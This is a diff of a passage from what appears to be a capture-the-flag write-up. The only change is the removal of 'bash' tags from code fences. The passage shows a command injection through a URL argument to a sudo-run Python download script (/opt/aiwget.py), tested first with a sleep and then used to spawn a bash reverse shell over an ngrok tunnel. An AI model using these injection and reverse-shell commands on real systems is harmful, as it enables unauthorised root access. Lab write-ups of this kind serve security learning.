@@ -64,7 +64,7 @@ we found a cve for [utils.download._wget_download](https://nvd.nist.gov/vuln/det
 
 So we tried to do so
 
-```bash
+```
 sudo /usr/bin/python3 /opt/aiwget.py "https://; sleep 10" /tmp/model
 ```
 
@@ -72,13 +72,13 @@ sudo /usr/bin/python3 /opt/aiwget.py "https://; sleep 10" /tmp/model
 
 and it works so lets try to get a revere shell using ngrok
 
-```bash
+```
 ngrok tcp 4444 
 ```
 
 ![image.png](/assets/img/posts/Aibot/image%203.png)
 
-```bash
+```
 sudo /usr/bin/python3 /opt/aiwget.py "https://; bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/14455 0>&1'" /tmp/model
 ```
 
